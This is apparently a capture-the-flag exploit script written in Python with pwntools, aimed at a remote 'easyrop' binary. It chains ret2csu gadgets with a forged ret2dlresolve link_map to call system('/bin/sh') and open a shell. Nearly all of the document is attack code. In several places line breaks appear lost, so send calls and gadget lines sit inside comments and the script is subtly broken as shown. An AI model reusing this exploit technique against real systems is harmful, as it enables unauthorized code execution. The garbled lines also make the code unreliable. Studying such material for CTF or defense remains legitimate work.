from pwn import *

context.terminal = ["tmux","splitw","-h"] context.arch = "amd64"
context.bits = 64

#p = process("./easyrop")
p = remote('10.212.25.14', 14419)
elf = ELF("./easyrop")

context.log_level="debug"
#gdb.attach(p, 'b *0x0000000000400671')

bss_addr = elf.bss()
csu_front_addr = 0x00000000004006C0
csu_end_addr = 0x00000000004006DA
vuln_addr = 0x00000000004005F7

def csu(rbx, rbp, r12, r13, r14, r15): # pop rbx, rbp, r12, r13, r14, r15 # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call # rdi = edi = r13d
    # rsi = r14 # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload

def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)

    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr) & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)
    linkmap += '/bin/sh\x00'	# cmd offset 0x48
    linkmap = linkmap.ljust(0x68, 'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)

fake_linkmap_addr = bss_addr+0x100


# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./easyrop")
offset = 0x40+8
rop.raw(offset*'\x00')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
off_2addr = libc.sym['system']- libc.sym['read']
off_2addr = -0xc0bf0
link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got['read'],off_2addr)

rop.raw(csu(0, 1, elf.got['read'], 0, fake_linkmap_addr, len(link_map)))
rop.raw(vuln_addr)
#rop.raw("a"*(256-len(rop.chain()))) assert(len(rop.chain()) <= 256) print rop.dump() p.sendline(rop.chain())
# send linkmap p.send(link_map)

rop = ROP("./easyrop")
rop.raw(offset*'\x00')
#0x00000000004006e1: pop rsi; pop r15; ret; rop.raw(0x00000000004006e1)	# stack align 16 bytes rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004006e3)	# 0x00000000004007a3: pop rdi; ret; rop.raw(fake_linkmap_addr + 0x48)
rop.raw(resolve_call)
p.send(rop.chain())
p.interactive()
